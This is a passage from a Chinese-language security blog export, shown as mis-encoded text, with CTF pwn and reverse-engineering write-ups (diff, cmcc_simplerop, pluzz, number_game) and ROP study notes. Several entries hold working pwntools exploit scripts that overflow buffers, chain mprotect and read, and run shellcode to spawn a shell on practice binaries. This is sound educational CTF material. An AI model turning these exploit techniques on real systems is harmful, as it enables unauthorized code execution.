Ë¢´ÊêûÊôï‰∫ÜÔºåÊ≤°Ê≥®ÊÑèÂà∞Êñá‰ª∂‰∏ÄÁöÑÂÜÖÂÆπÁõ¥Êé•ÂÜôËøõbssÔºåÂèØ‰ª•ÈÄöËøáËøô‰∏™getshellÔºåÁúã‰∫ÜÂà´ÁöÑÂ∏àÂÇÖÁöÑwriteupÊâçÁü•ÈÅìÔºåÂ§™Á≤óÂøÉ‰∫Ü„ÄÇ ÊºèÊ¥ûÂ§ÑÂú®compareÂáΩÊï∞ÈáåÔºåaddr‰πüÂ∞±ÊòØÊñá‰ª∂‰∫åËØªÂèñÊ≤°ÊúâÈôêÂà∂ÈïøÂ∫¶ÔºåË∂ÖËøá0x78Â≠óËäÇÂ∞±‰ºöÊ∫¢Âá∫ÔºåËÄåbuf1ÊòØËØªÂà∞bssÈáåÁöÑÔºåÊúâÂõ†‰∏∫Ê≤°ÊúâÂºÄNXÔºåÂèØ‰ª•Áõ¥Êé•ÊéßÂà∂Á®ãÂ∫èË∑≥Âà∞buf1Â§ÑÊâßË°åshellcode„ÄÇ 1234567891011121314151617181920int __cdecl compare(int a1, int fd)&#123; char v2; // al int v4; // [esp+0h] [ebp-80h] unsigned int i; // [esp+4h] [ebp-7Ch] char addr[120]; // [esp+8h] [ebp-78h] v4 = 0; JUMPOUT(sys_read(fd, buf1, 0x80u), 0, &amp;failed); JUMPOUT(sys_read(a1, addr, 0x80u), 0, &amp;failed); for ( i = 0; addr[i] + buf1[i] &amp;&amp; i &lt; 0x400; ++i ) &#123; v2 = buf1[i]; if ( v2 != addr[i] ) return v4 + 1; if ( v2 == 10 ) ++v4; &#125; return 0;&#125; ÈôÑ‰∏äexp 123456789101112131415161718192021222324252627from pwn import *import base64buf = 0x0804A024shellcode = asm(shellcraft.sh())payload = flat(cyclic(124),buf)context.log_level = 'DEBUG'context.binary = './diff'if sys.argv[1] == 'l': p = process(argv=['diff','/tmp/123','/tmp/456'],executable='./diff') f1 = open('/tmp/123','wb') f2 = open('/tmp/456','wb') f1.write(shellcode) f2.write(payload) f1.close() f2.close()else: pwn_ssh = ssh(host='node3.buuoj.cn',user='ctf',password='guest',port=26462) p = pwn_ssh.process('/bin/bash') p.sendline('echo &#123;&#125; | base64 -d &gt; /tmp/123;echo &#123;&#125; | base64 -d &gt; /tmp/456'.format(base64.b64encode(shellcode),base64.b64encode(payload))) p.close() p = pwn_ssh.process(argv=['diff','/tmp/123','/tmp/456'],executable='./diff')elf = ELF('./diff')p.interactive()]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
        <tag>machineKey</tag>
        <tag>XSS</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[PWN]cmcc_simplerop]]></title>
    <url>%2F2020%2F03%2F06%2FPWN-cmcc_simplerop%2F</url>
    <content type="text"><![CDATA[cmcc_simplerop Writeup https://buuoj.cn/challenges#cmcc_simplerop IDAÊâìÂºÄÈôÑ‰ª∂ÂèëÁé∞‰∏ªÁ®ãÂ∫èÂ∞±ÊòØÁÆÄÂçïÁöÑÊ†àÊ∫¢Âá∫„ÄÇ Âπ∂‰∏îÊòØÈùôÊÄÅÈìæÊé•ÁöÑÁ®ãÂ∫èÔºåÊü•ÊâæsystemÂáΩÊï∞‰∏çÂ≠òÂú®Ôºå‰ΩÜÂèëÁé∞‰∫ÜmprotectÂáΩÊï∞„ÄÇ mprotect(const void *start, size_t len, int prot)ÂáΩÊï∞ËÉΩÊîπÂèò‰∏Ä‰∏™ÂÜÖÂ≠òÂå∫ÁöÑ‰øùÊä§Â±ûÊÄßÔºåÊåáÂÆöÁöÑÂÜÖÂ≠òÂå∫Èó¥ÂøÖÈ°ªÂåÖÂê´Êï¥‰∏™ÂÜÖÂ≠òÈ°µÔºåÊàëÂÅöÂà∞ÁöÑÈ¢òÁõÆÈ°µÂ§ßÂ∞èÈÄöÂ∏∏‰∏∫1K„ÄÇÊó¢Ëã•Ë¶ÅÊîπÂèòbssÁöÑ‰øùÊä§Â±ûÊÄßÔºåbssÁöÑÂú∞ÂùÄ‰∏∫0x80eaf80ÔºåÂàôËµ∑ÂßãÂú∞ÂùÄ‰∏∫0x80ea000ÔºåÈ°µÂ§ßÂ∞è‰∏∫1000ÔºåÊùÉÈôê‰∏∫7Ë°®Á§∫ÂèØËØªÂèØÂÜôÂèØÊâßË°å„ÄÇ Áé∞Âú®ÁöÑÊÄùË∑ØÊòØÈÄöËøámprotectÊîπÂèòbssÁöÑ‰øùÊä§Â±ûÊÄßÔºåÂÜçÈÄöËøáreadÂÜôÂÖ•shellcodeÔºåË∑≥ËΩ¨Âà∞bssÂ§ÑÊâßË°å„ÄÇ ‰ª•‰∏ãÊòØexp„ÄÇ 1234567891011121314151617181920212223242526272829from pwn import *context.log_level = 'DEBUG'context.binary = './simplerop'if sys.argv[1] == 'l': p = process('./simplerop')else: p = remote('node3.buuoj.cn',28957)elf = ELF('./simplerop')bss = elf.bss()print(hex(bss))mprotect_sym = elf.sym['mprotect']read_sym = elf.sym['read']pop3 = 0x08048913payload = flat(cyclic(32),mprotect_sym,pop3,0x80ea000,0x1000,0x7,read_sym,pop3,0x0,bss+0x50,0x50,bss+0x50)p.recvuntil(':')# gdb.attach(p)p.send(payload)sleep(1)p.send(asm(shellcraft.sh()))p.interactive() ÂêéËØùÂΩìÊàëÊÉ≥Ë¶ÅÂú®Á¨¨‰∏Ä‰∏™sendÂâçË∞ÉËØïÁöÑÊó∂ÂÄôÔºåÊØèÊ¨°Á®ãÂ∫èÈÉΩÂºÇÂ∏∏ÈÄÄÂá∫„ÄÇ‰∏ÄÂºÄÂßãËøò‰ª•‰∏∫ÊòØpayloadÊúâÈîôÔºåÂêéÊù•ÂéªÂà∞bssÊü•ÁúãÁöÑÊó∂ÂÄôÂèëÁé∞shellcodeÂπ∂‰πàÊúâËæìÂÖ•ÂÖ®„ÄÇ‰º∞ËÆ°ÊòØÁî±‰∫éË∞ÉËØïÁ®ãÂ∫èÔºåÂèëÈÄÅshellcodeÊØîreadËØªÂèñÂæ∑Ë¶ÅÂø´ÔºåÂØºËá¥Ê≤°ÊúâËæìÂÖ•ÂÖ®ÔºåÊ≥®ÈáäÊéâË∞ÉËØïÂ∞±Ê≤°ÊúâÂºÇÂ∏∏ÈÄÄÂá∫‰∫Ü„ÄÇ]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>StackOverflow</tag>
        <tag>mprotect</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[ÈÄÜÂêëÂ≠¶‰π†Á¨îËÆ∞]‰∏äÊµ∑ÂÖ®ÂõΩÂ§ßÂ≠¶ÁîüÁΩëÁªúÂÆâÂÖ®ÈÇÄËØ∑Ëµõ-pluzz]]></title>
    <url>%2F2019%2F10%2F26%2F%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%8A%E6%B5%B7%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B-pluzz%2F</url>
    <content type="text"><![CDATA[0x00ÂâçË®Ä ËøôÂõû‰∏äÊµ∑Â§ßÂ≠¶ÁîüÁΩëÁªúÂÆâÂÖ®ÈÇÄËØ∑ËµõÂ∞±Áúã‰∫ÜËøôÈ¢òÔºåÂÆûÂú®ÊòØÊ≤°Á©∫„ÄÇ‰∏çËøáËøôÊ¨°Êàë‰Ωú‰∏∫Ë∑ëÈæôÂ•óÁöÑreÊâãÊÄùË∑ØÊúÄÊ∏ÖÊô∞ÁöÑ‰∏ÄÂõû‰∫ÜÔºåÂÄºÂæóËÆ∞ÂΩï‰∏ãÊù•„ÄÇ 0x01ÊÄùË∑Ø‰Ωú‰∏∫Ê±áÁºñÂü∫Á°Ä‰∏çÊâéÂÆûÁöÑË∑ëÈæôÂ•óreÊâãÔºåÊãøÂà∞È¢òÁõÆÂΩìÁÑ∂ÊòØ‰ªçÁªèIDAÊù•F5‰∏ÄÊ≥¢„ÄÇ mainÂáΩÊï∞ÁöÑÈÄªËæëÂæàÁÆÄÂçïÔºåifÂà§Êñ≠‰∏∫ÁúüÂ∞±Âú®sub_401BA0ËæìÂá∫flag„ÄÇÈÄöËøáODÂä®Ë∞ÉÂæóÁü•v11Â∞±ÊòØÈÄöËøáËæìÂÖ•ÁöÑv9‰Ωú‰∏∫ÁßçÂ≠ê‰ªÄ‰πàÁöÑÔºåÁªèËøásub_401BA0ÂáΩÊï∞Ëé∑Âæóuuid„ÄÇ ifÈáåÁ¨¨‰∏Ä‰∏™ÂáΩÊï∞ÁÆÄÂçïÁöÑÂà§Êñ≠ËæìÂÖ•ÈïøÂ∫¶ÊòØÂê¶‰∏∫16‰ΩçÔºåÁÑ∂ÂêéÊòØ‰∏Ä‰∏™whileÂæ™ÁéØÔºåÊàë‰∏ÄÂºÄÂßãnavieÁöÑËÆ§‰∏∫Âè™ËÉΩËæìÂÖ•a-fÁöÑÂ≠óÁ¨¶ÔºåÂêéÊù•ÊâçÂèëÁé∞ËæìÂÖ•1-9ÁöÑÊó∂ÂÄôÁ±ªÂûãËΩ¨Êó†Á¨¶Âè∑ÂûãÔºåÁªìÊûú‰πü‰ºöÊØî&amp;Â§ßÔºå‰ª•ÂêéÈÅáÂà∞Á±ªÂûãËΩ¨Êç¢‰∏ÄÁÇπË¶ÅÊ≥®ÊÑè‰∫Ü„ÄÇ Á¨¨‰∫å‰∏™ÂáΩÊï∞Ê≤°ÁúãÊáÇÊòØ‰ªÄ‰πàÊìç‰ΩúÔºå‰ΩÜË∞∑Ê≠å‰∫Ü‰∏Ä‰∏ã%02XÊ†ºÂºèÂåñËæìÂá∫‰Ωç‰∏§‰Ωç16ÁöÑÊÑèÊÄùÔºåÂä®Ë∞ÉÁöÑÁªìÊûú‰πüÁ°ÆÂÆûÂ¶ÇÊ≠§„ÄÇÂÄºÂæóÊ≥®ÊÑèÁöÑÊòØsub_401B60ÁöÑ‰∏§ÂèÇÊï∞ÊòØ‰º†ÂºïÁî®ËøõÂéªÁöÑÔºåÂú®ÊâßË°åÂÆåËøô‰∏™ÂáΩÊï∞‰πãÂêéÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÁöÑÂÄºÂèëÁîü‰∫ÜÊîπÂèòÔºåÊâÄ‰ª•‰∏Ä‰∏™ÂáΩÊï∞Èô§‰∫ÜÁúãËøîÂõûÂÄºÂ§ñËøòË¶ÅÁúãÂÆÉÁöÑÂèÇÊï∞ÊòØÂê¶‰∏∫ÊåáÈíàÊàñËÄÖÂºïÁî®„ÄÇÂ§™Ëèú‰∫ÜÁé∞Âú®ÊâçÈ¢ÜÊÇüÂà∞Ëøô‰∏™ÈÅìÁêÜ„ÄÇ Á¨¨‰∏â‰∏™ÂáΩÊï∞IDAÁöÑ‰º™‰ª£Á†Å‰πüÊ≤°ÁúãÊáÇÊòØ‰ªÄ‰πàÊìç‰ΩúÔºåÂ•ΩÂú®Ëøô‰∏™ÂáΩÊï∞Âú®Ëøô‰πãÂâç‰∏éËæìÂÖ•ÁöÑÂ≠óÁ¨¶‰∏≤ÂÖ≥„ÄÇÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞‰∏∫ÂèñÊåáÈíàÔºåÁõ¥Êé•Âä®Ë∞É‰∏Ä‰∏ãÁúãÁªìÊûúÔºåÂá∫Êù•‰∫Ü‰∏Ä‰∏≤Â•ΩÂÉèÊòØintÂûãÁöÑ‰∏úË•øÔºåÂêé‰∏Ä‰∏™ÂáΩÊï∞‰ºöÁî®Âà∞ÂÖàdump‰∏ãÊù•„ÄÇ Á¨¨Âõõ‰∏™ÂáΩÊï∞ËøôÂõûÁúãÊáÇ‰∫ÜÔºåÂ∞±ÊòØÂ∞ÜËΩ¨Êç¢ÂêéÁöÑ16ËøõÂà∂‰∏é‰∏ä‰∏Ä‰∏™ÂáΩÊï∞ÁöÑÁªìÊûúÁöÑÁ¨¨i‰ΩçÂíåÂâçi‰ΩçÁöÑÂíåËøõË°åÂºÇÊàñÔºåÂÖàÊääË¶ÅÂºÇÊàñÁöÑÊï∞dump‰∏ãÊù•Â§áÁî®„ÄÇËøîÂõûÂÄºÊÅí‰∏∫ÁúüÔºåÂÖàÊîæ‰∏ÄËæπ„ÄÇ Á¨¨‰∫î‰∏™ÂáΩÊï∞Â∞§‰∏∫ÂÖ≥ÈîÆÔºåË∑üÁ¨¨‰∏Ä‰∏™ÂáΩÊï∞‰∏ÄÊ†∑ÂÜ≥ÂÆö‰∫ÜËÉΩ‰∏çËÉΩÂ§∫Âæóflag„ÄÇ‰º†ÂÖ•8‰∏™Â≠óËäÇÂºÇÊàñÂêéÁöÑÁªìÊûúÔºåÊØèÂ≠óËäÇ‰∏çËÉΩÊâìÂ§ß‰∫é9‰∏îË¶ÅÊª°Ë∂≥7‰∏™Âà§Êñ≠ËØ≠Âè•„ÄÇËøôÈáåÊåâÁÖßÂÆÉÁöÑÈÄªËæëÊääÂÖ´‰ΩçÊï∞ÁàÜÂá∫Êù•Â∞±Ë°å‰∫ÜÔºå‰ΩÜÊòØ‰∏ÄÂºÄÂßãÁî®pythonÂÜôÁöÑËÑöÊú¨‰∏ÄÂ†ÜÈóÆÈ¢òÔºåÊï¥ÂæóÊàëÂú®ÊØîËµõÁªìÊùüÂâçÊ≤°ÂÅöÂá∫Êù•„ÄÇÊúÄÂêéÁî®c++ÂÜô‰∏ãÂ∞±ÊêûÂá∫Êù•‰∫Ü„ÄÇ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128#include&lt;iostream&gt;#include&lt;string&gt;#include&lt;ios&gt;using namespace std;long long int dword_40F020 = 0x8A;long long int dword_40F024 = 0x01A1;long long int dword_40F028 = 0x012A;long long int dword_40F02C = 0x0269;long long int dword_40F030 = 0x0209;long long int dword_40F034 = 0x68;long long int dword_40F038 = 0x039F;long long int dword_40F03C = 0x02C8;long long int dword_40F040 = 0x00FF;int test(int v);void flag(int v);int main()&#123; int v = 0; int i; for (i = 10000000; i &lt;= 99999999; ++i) &#123; int j = i; while (j != 0) &#123; if (test(j % 10) == 1) &#123; cout &lt;&lt; i &lt;&lt; endl; flag(i); return 0; &#125; j /= 10; &#125; dword_40F020 = 0x8A; dword_40F024 = 0x01A1; dword_40F028 = 0x012A; dword_40F02C = 0x0269; dword_40F030 = 0x0209; dword_40F034 = 0x68; dword_40F038 = 0x039F; dword_40F03C = 0x02C8; dword_40F040 = 0x00FF; &#125; return 0;&#125;int test(int v)&#123; int result = 0; switch (v) &#123; case 0: dword_40F028 &amp;= dword_40F038; dword_40F02C *= dword_40F028; goto LABEL_4; case 1: if (!dword_40F02C) goto LABEL_6; dword_40F028 /= dword_40F02C; dword_40F024 += dword_40F034; goto LABEL_4; case 2: dword_40F030 ^= dword_40F034; dword_40F03C += dword_40F020; goto LABEL_4; case 3: dword_40F03C -= dword_40F030; dword_40F030 &amp;= dword_40F024; goto LABEL_4; case 4: dword_40F034 *= dword_40F020; dword_40F02C -= dword_40F038; goto LABEL_4; case 5: dword_40F020 ^= dword_40F02C; dword_40F038 -= dword_40F03C; goto LABEL_4; case 6: if (!dword_40F03C) goto LABEL_6; dword_40F034 |= dword_40F024 / dword_40F03C; dword_40F024 /= dword_40F03C; goto LABEL_4; case 7: dword_40F038 += dword_40F028; dword_40F034 |= dword_40F024; goto LABEL_4; case 8: dword_40F020 *= dword_40F02C; dword_40F030 -= dword_40F03C; goto LABEL_4; case 9: dword_40F028 += dword_40F034; dword_40F02C ^= dword_40F030; LABEL_4: result = ((dword_40F038 == 231) + (dword_40F034 == 14456)+ (dword_40F030 == 14961)+ (dword_40F02C == -13264)+ (dword_40F028 == 16)+ (dword_40F024 == 104)+ (dword_40F020 == -951) == 7); if (dword_40F03C != -239) goto LABEL_6; break; default: LABEL_6: return 0; break; &#125; return result;&#125;void flag(int v)&#123; int a[] = &#123; 0x7C,0xAB,0x2D,0x91,0x2F,0x98,0xED,0xA9 &#125;; int j = 0; while (v) &#123; for (int i = 0; i &lt;= 256; ++i) &#123; if (v % 10 == (i ^ a[j])) &#123; printf("%02x", i); break; &#125; &#125; v /= 10; j += 1; &#125;&#125; ËøêË°åÁªìÊûúÔºö 270594167aaa29982a98eaab ËæìÂÖ•Âà∞È¢òÁõÆÊñá‰ª∂‰∏≠Ôºö Plz solve the puzzle: 7aaa29982a98eaabCongrats!flag{5cb92582-66a8-e5b7-d3bf-3b99df8ac7f0} 0X02ÊÄªÁªì Â∫îÂΩìÊ≥®ÊÑèÁ±ªÂûãË£ÖÊç¢Ôºå‰ª•ÂèäËΩ¨Êç¢ÂêéÁöÑÂ≠óËäÇÂ§ßÂ∞è Èô§‰∫ÜÂáΩÊï∞ÁöÑËøîÂõûÂÄºÔºåËøòÂèØ‰ª•‰ªéÂèÇÊï∞ÁöÑÂºïÁî®ÊàñÊåáÈíàËé∑ÂèñÁªìÊûú ÂèØ‰ª•ÈÄöËøáÂä®ÊÄÅË∞ÉËØïÂáΩÊï∞ÁöÑÁªìÊûúÂæóÁü•ÂáΩÊï∞ÁöÑÂäüËÉΩ]]></content>
      <categories>
        <category>ÈÄÜÂêë</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[[PWN]Ê†àÊ∫¢Âá∫-ROPÂ≠¶‰π†Á¨îËÆ∞]]></title>
    <url>%2F2019%2F05%2F25%2FPWN-%E6%A0%88%E6%BA%A2%E5%87%BA-ROP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[ROPÁÆÄ‰ªã Èù¢ÂêëËøîÂõûÁºñÁ®ãÔºàËã±ËØ≠ÔºöReturn-Oriented ProgrammingÔºåÁº©ÂÜôÔºöROPÔºâÊòØËÆ°ÁÆóÊú∫ÂÆâÂÖ®ÊºèÊ¥ûÂà©Áî®ÊäÄÊúØÔºåËØ•ÊäÄÊúØÂÖÅËÆ∏ÊîªÂáªËÄÖÂú®ÂÆâÂÖ®Èò≤Âæ°Ôºà‰∏ªË¶Å‰∏∫NXÔºå Â†ÜÊ†à‰∏çÂèØÊâßË°å‰øùÊä§ÔºâÁöÑÊÉÖÂÜµ‰∏ãÊâßË°å‰ª£Á†ÅÔºåÂ¶Ç‰∏çÂèØÊâßË°åÁöÑÂÜÖÂ≠òÂíå‰ª£Á†ÅÁ≠æÂêç„ÄÇÊîªÂáªËÄÖÊéßÂà∂Â†ÜÊ†àË∞ÉÁî®‰ª•Âä´ÊåÅÁ®ãÂ∫èÊéßÂà∂ÊµÅÂπ∂ÊâßË°åÈíàÂØπÊÄßÁöÑÊú∫Âô®ËØ≠Ë®ÄÊåá‰ª§Â∫èÂàóÔºàÁß∞‰∏∫GadgetsÔºâ„ÄÇ ÊØè‰∏ÄÊÆµgadgetÈÄöÂ∏∏ÁªìÊùü‰∫éreturnÊåá‰ª§ÔºåÂπ∂‰Ωç‰∫éÂÖ±‰∫´Â∫ì‰ª£Á†Å‰∏≠ÁöÑÂ≠êÁ®ãÂ∫è„ÄÇ Ëã•Á®ãÂ∫èÊª°Ë∂≥ÂèØ‰ª•ÊéßÂà∂ËøîÂõûÂú∞ÂùÄÂíåÂèØ‰ª•ÊâæÂà∞Á¨¶ÂêàË¶ÅÊ±ÇÁöÑgadgets‰ª•ÂèägadgetsÂú∞ÂùÄÔºåÂ∞±ËøõË°åROP„ÄÇÊàë‰ª¨ÈÄâÊã©ÁöÑgadgetsÂ§ßÂ§öÊòØpop register;ret;ÊàñËÄÖmov register xx;ret;‰πãÁ±ªÁöÑÔºàÊàëÈÅáÂà∞ÁöÑÂ§ßÂ§öÊï∞ÊÉÖÂÜµÊòØËøôÊ†∑ÁöÑÔºåÈîô‰∫ÜËØ∑Âà∞‰∫ÜÊâìËÑ∏ÔºâÂØπÂØÑÂ≠òÂô®ËµãÂÄº„ÄÇ ‰ª•‰∏ã‰æãÂ≠êÈÉΩÈªòËÆ§ÂºÄÂêØ‰∫ÜÊ†à‰∏çÂèØÊâßË°å‰øùÊä§ ÈùôÊÄÅÈìæÊé•ÂéüÁêÜÊúâÁöÑÁ®ãÂ∫èÁºñËØëÊó∂ÂÄô‰ΩøÁî®ÁöÑÊòØÈùôÊÄÅÈìæÊé•ÔºåÊâÄ‰ª•Â∫ìÈáåÊâÄÊúâÂáΩÊï∞ÁöÑpltÂ∞±Êúâ‰∫Ü„ÄÇ ‰æãÂ≠êhackmeÁöÑROP ret2textÂéüÁêÜÈÄöËøáÁ®ãÂ∫èÂ∑≤ÊúâÁöÑ‰ª£Á†ÅÊûÑÈÄ†ROPÈìæ„ÄÇ ‰æãÂ≠êctf-wilkiÁöÑret2textÔºåÁ®ãÂ∫è‰∏≠Â∞±Â≠òÂú®system(&quot;/bin/sh&quot;)ÔºåÊàë‰ª¨ÂèØ‰ª•Âà©Áî®system(&quot;/bin/sh&quot;)ËøõË°ågetshell„ÄÇ 12345678910111213void secure()&#123; unsigned int v0; // eax int input; // [esp+18h] [ebp-10h] int secretcode; // [esp+1Ch] [ebp-Ch] v0 = time(0); srand(v0); secretcode = rand(); __isoc99_scanf((const char *)&amp;unk_8048760, &amp;input); if ( input == secretcode ) system("/bin/sh");&#125; ÂÜçÁúãÁúãIDA‰∏≠mainÂáΩÊï∞ÁöÑ‰º™‰ª£Á†Å„ÄÇ 1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts("There is something amazing here, do you know anything?"); gets(&amp;s); printf("Maybe I will tell you next time !"); return 0;&#125; getsÂáΩÊï∞Ê≤°ÊúâÈôêÂà∂ËæìÂÖ•ÈïøÂ∫¶ÔºåÊòØ‰∏Ä‰∏™ÂÖ∏ÂûãÁöÑÂ†ÜÊ†àÊ∫¢Âá∫„ÄÇÊàë‰ª¨Âà©Áî®gdbÁöÑÊèí‰ª∂pedaÁöÑÂäüËÉΩÔºåpattcÂíåpattsÂ∞±ÂèØ‰ª•ËÆ°ÁÆóÂá∫Â°´ÂÖÖÊï∞ÊçÆÁöÑÂ§ßÂ∞è112„ÄÇËÄåsystem(&quot;/bin/sh&quot;)ÁöÑÂú∞ÂùÄÊòØÔºâ0x8048648„ÄÇÊúÄÂêéÁ•≠‰∏äÁ•ûÂô®pwntools„ÄÇ 123456789from pwn import *system_plt=0x8048648shellcode='a'*112+p32(system_olt)p.recv()p=process('./ret2text')p.sendline()p.interactive() ret2shellcodeÂéüÁêÜËã•Á®ãÂ∫èÊ†à‰∏çÂèØÊâßË°åÔºå‰ΩÜÊàë‰ª¨ÂèØ‰ª•ÊéßÂà∂ÂÖ∂‰ªñÂèØÊâßË°åÁöÑÊÆµÔºåÂ¶ÇbssÊÆµÔºàÂ≠òÂÇ®ÂÖ®Â±ÄÂèòÈáèÔºâÔºåÈÇ£‰πàÊàë‰ª¨Â∞±ÂèØ‰ª•Â∞ÜshellcodeÂÜôÂÖ•ÂÖ∂‰∏≠ÔºåÂÜçÊéßÂà∂Á®ãÂ∫èËøîÂõûÂú∞ÂùÄË∑≥ËΩ¨Âà∞ËøôÈáåÊâßË°åshellcode„ÄÇ ‰æãÂ≠ê‰ª•ctf-wikiÁöÑret2shellcode‰∏∫‰æã„ÄÇ 123456789101112int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts("No system for you this time !!!"); gets((char *)&amp;v4); strncpy(buf2, (const char *)&amp;v4, 0x64u); printf("bye bye ~"); return 0;&#125; ‰∏éÂâçÈù¢ÁöÑret2textÁõ∏‰ººÔºå‰ΩÜËøôÈáåÂ∑≤ÁªèÊ≤°Êúâsystem(&quot;/bin/sh&quot;),ÂèñËÄå‰ª£‰πãÁöÑÊòØstrncpy„ÄÇËôΩÁÑ∂strncpy‰∏çÂ≠òÂú®Ê†àÊ∫¢Âá∫ÊºèÊ¥ûÔºå‰ΩÜËøôÈáåÁöÑbuf2ÊòØÂú®bssÊÆµ‰∏äÔºåÊàë‰ª¨ËÉΩÂ∞ÜshellcodeÂ§çÂà∂Âà∞bssÊÆµÈáåÔºåÂÜçÊéßÂà∂Á®ãÂ∫èË∑≥ËΩ¨Âà∞bssÊÆµÊâßË°åshellcode„ÄÇ 1234567891011#-*-coding:utf-8-*-#!/usr/bin/env pythonfrom pwn import *sh = process('./ret2shellcode')shellcode = asm(shellcraft.sh())#shellcraftÊòØpwntoolsÁöÑshellcodeÁîüÊàêÂô®buf2_addr = 0x804a080sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))sh.interactive() ret2syscallÂéüÁêÜsyscallÂç≥Á≥ªÁªüË∞ÉÁî®ÔºåÈÄöËøáË∞ÉÁî®Âè∑Ë∞ÉÁî®Á≥ªÁªüÂáΩÊï∞„ÄÇ ÂæÖÁª≠„ÄÇ„ÄÇÂèÇËÄÉËµÑÊñô Âü∫Êú¨ ROP ÂÜçËÆÆ PLT ‰∏é GOT]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>StackOverflow</tag>
        <tag>ROP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[ÈÄÜÂêëÂ≠¶‰π†Á¨îËÆ∞]Ê°ÇÊûóÁîµÂ≠êÁßëÊäÄÂ§ßÂ≠¶‚ÄúÊ∑±‰ø°ÊúçÊùØ‚Äù]]></title>
    <url>%2F2019%2F05%2F23%2F%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%A1%82%E6%9E%97%E7%94%B5%E5%AD%90%E7%A7%91%E6%8A%80%E5%A4%A7%E5%AD%A6%E2%80%9C%E6%B7%B1%E4%BF%A1%E6%9C%8D%E6%9D%AF%E2%80%9D%2F</url>
    <content type="text"><![CDATA[0x0number_gameË∑üflagÁõ¥Êé•Áõ∏ÂÖ≥ÁöÑÂ∞±ÊòØËøô‰∏™ÂáΩÊï∞„ÄÇ 1234567891011121314151617181920212223__int64 sub_400917()&#123; unsigned int v1; // [rsp+0h] [rbp-10h] signed int i; // [rsp+4h] [rbp-Ch] signed int j; // [rsp+8h] [rbp-8h] int k; // [rsp+Ch] [rbp-4h] v1 = 1; for ( i = 0; i &lt;= 4; ++i ) &#123; for ( j = 0; j &lt;= 4; ++j ) &#123; for ( k = j + 1; k &lt;= 4; ++k ) &#123; if ( *(&amp;unk_601060 + 5 * i + j) == *(&amp;unk_601060 + 5 * i + k) ) v1 = 0; if ( *(&amp;unk_601060 + 5 * j + i) == *(&amp;unk_601060 + 5 * k + i) ) v1 = 0; &#125; &#125; &#125; return v1;&#125; ÂàÜÊûê‰∫Ü‰∏Ä‰∏ãÔºåÈ¢òÁõÆÁöÑË¶ÅÊ±ÇÂ∞±ÊòØË°•ÂÖ®‰∏Ä‰∏™Á°¨ÁºñÁ†ÅÂú®ÂÜÖÂ≠òÈáåÁöÑ5x5Áü©ÈòµÔºåÂÆÉÁöÑÊ®™Á´ñ‰∏çËÉΩÊúâÁõ∏ÂêåÁöÑÊï∞Â≠ó„ÄÇÂú®Ê†πÊçÆÂâçÈù¢Âè™ËÉΩËæìÂÖ•0~5ÁöÑÊï∞Â≠óÔºåÊâãÂä®‰∏Ä‰∏ãÔºåÂæàÂÆπÊòìËøòÂéü‰∫ÜÁü©Èòµ„ÄÇ ÂæóÂà∞ËøòÂéüÂá∫Êù•ÁöÑÂ≠óÁ¨¶‰∏≤Ôºå‰ΩÜËøôÊòØÈÄö‰∫ÜÂâç‰∏§‰∏™ÂáΩÊï∞ÂÅèÁßªÁöÑÂá∫Êù•ÁöÑÁü©Èòµ„ÄÇ 123456789101112131415161718_QWORD *__fastcall sub_400758(__int64 cin, int offset, int a3)&#123; _QWORD *v4; // rax _QWORD *v5; // ST28_8 int str_long; // [rsp+0h] [rbp-30h] char v7; // [rsp+1Fh] [rbp-11h] str_long = a3; v7 = *(offset + cin); if ( v7 == 32 || v7 == 10 || offset &gt;= a3 ) return 0LL; v4 = malloc(0x18uLL); v5 = v4; *v4 = v7; v4[1] = sub_400758(cin, 2 * offset + 1, str_long); v5[2] = sub_400758(cin, 2 * (offset + 1), str_long); return v5;&#125; 12345678910111213__int64 __fastcall sub_400807(__int64 a1, __int64 a2)&#123; __int64 result; // rax result = a1; if ( a1 ) &#123; sub_400807(*(a1 + 8), a2); *(a2 + dword_601080++) = *a1; result = sub_400807(*(a1 + 16), a2); &#125; return result;&#125; ÁúãÊù•Âá∫È¢ò‰∫∫ÂæàÂñúÊ¨¢ÈÄíÂΩíÂïäÔºÅÔºÅÔºÅËøôÈÄíÂΩíÁúãÂæóÁúºËä±Áº≠‰π±„ÄÇ Â∫ÜÂπ∏ÁöÑÊòØÂÅèÁßª‰∏éËæìÂÖ•ÂÜÖÂÆπÊó†ÂÖ≥„ÄÇËæìÂÖ•0123456789ÔºåÂÜçpatch‰∏Ä‰∏ãZFÔºåÂ∞±ËÉΩÂæóÂá∫ÂéüÂ≠óÁ¨¶‰∏≤ÂíåÂÅèÁßªÂêéÁöÑÂ≠óÁ¨¶‰∏≤„ÄÇ Êï¥‰∏™pythonËÑöÊú¨Ë∑ë‰∏ÄË∑ëÂç≥ÂèØÂæóÂà∞flag„ÄÇ 12345678910ch = '7381940526'code = '0421421430'flag = ['','','','','','','','','','']for i in xrange(10): flag[ord(ch[i])-ord('0')]=code[i]print 